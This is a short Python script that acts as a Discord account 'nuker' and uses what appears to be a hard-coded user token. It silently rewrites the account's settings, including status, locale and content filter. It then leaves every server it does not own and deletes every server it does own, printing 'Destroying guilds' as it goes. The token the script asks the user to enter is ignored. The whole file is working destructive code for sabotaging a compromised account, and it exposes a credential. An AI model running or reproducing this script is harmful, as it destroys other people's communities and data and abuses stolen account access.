import requests

input(" [?] Token: ")

headers = {
    'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type' : "application/json",
    'Authorization' : "Mjk5OTMwOTQ4OTMyMjA2NjA1.YD0LSA.4pjvVvdyIPbbMnQTw-vsgeDc4eE"
}

payload = {
    "theme" : "light",
    "locale" : "ja",
    "message_display_compact" : True,
    "inline_embed_media" : False,
    "gif_auto_play" : False,
    "render_embeds" : False,
    "render_reactions" : False,
    "animate_emoji" : False,
    "convert_emoticons" : False,
    "enable_tts_command" : False,
    "explicit_content_filter" : 0,
    "status" : "invisible"
}

print(" [+] Changeing settings")
requests.patch(
    "https://canary.discordapp.com/api/v6/users/@me/settings",
    headers = headers,
    json = payload
)

guild = {
         "channels" : None,
         "icon" : None,
         "name" : "JESUS SELFBOT",
         "region" : "europe"
}
print("Destroying guilds")


guilds = requests.get(
    "https://discord.com/api/v6/users/@me/guilds",
    headers = headers
).json()

headers = {
    'Authorization' : "Mjk5OTMwOTQ4OTMyMjA2NjA1.YD0LSA.4pjvVvdyIPbbMnQTw-vsgeDc4eE"
}

for i in guilds:
    try:
        if not i["owner"]:
            responce = requests.delete(
                f"https://discord.com/api/users/@me/guilds/{i['id']}",
                headers = headers
            )
        else:
            responce = requests.delete(
                f"https://discord.com/api/guilds/{i['id']}",
                headers = headers
            )

        print(responce)
    except Exception as e:
        print(e)

dms = guilds = requests.get(
    "https://discord.com/api/v6/users/@me/channels",
    headers = headers
).json()


# requests.post(
#     'https://discordapp.com/api/v6/guilds',
#     headers = headers,
#     json = guild
# )
